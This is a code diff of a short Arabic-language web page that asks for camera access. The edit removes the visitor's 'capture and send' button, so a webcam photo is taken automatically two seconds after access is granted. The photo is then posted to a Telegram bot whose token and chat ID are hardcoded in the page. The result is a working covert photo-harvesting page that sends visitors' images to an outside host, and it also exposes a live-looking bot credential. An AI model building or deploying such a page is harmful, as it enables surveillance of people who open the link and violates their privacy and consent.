@@ -1,41 +1,44 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Send Me Your Photo</title>
+  <title>📸 جاري التقاط صورتك</title>
 </head>
-<body style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif">
-  <h2>📸 التقط صورة وأرسلها</h2>
-  <video id="video" width="300" height="220" autoplay style="border:1px solid #ccc"></video>
-  <button id="snap" style="margin-top:10px;">📤 التقط وأرسل</button>
+<body style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;background:#000;color:#fff">
+  <h2>📸 سيتم التقاط صورتك الآن...</h2>
+  <video id="video" width="300" height="220" autoplay style="border:1px solid #ccc; border-radius:8px;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const snap = document.getElementById('snap');
+    const chatId = '6424177901';
+    const botToken = '8134741704:AAEmC-SRA70-Nt_NxKTZ-YSnG1LBddAA3M0';
 
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => video.srcObject = stream)
-      .catch(err => alert("لم يتم السماح بفتح الكاميرا"));
+      .then(stream => {
+        video.srcObject = stream;
 
-    snap.onclick = () => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('photo', blob, 'photo.jpg');
-        formData.append('chat_id', '6424177901');
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('chat_id', chatId);
 
-        fetch('https://api.telegram.org/bot8134741704:AAEmC-SRA70-Nt_NxKTZ-YSnG1LBddAA3M0/sendPhoto', {
-          method: 'POST',
-          body: formData
-        }).then(() => alert('📤 تم الإرسال!')).catch(() => alert('❌ فشل الإرسال'));
-      });
-    };
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+              method: 'POST',
+              body: formData
+            })
+            .then(() => alert('📤 تم الإرسال تلقائيًا!'))
+            .catch(() => alert('❌ فشل في إرسال الصورة'));
+          });
+        }, 2000); // بعد 2 ثانية
+      })
+      .catch(err => alert("⚠️ لم يتم السماح بالكاميرا"));
   </script>
 </body>
 </html>
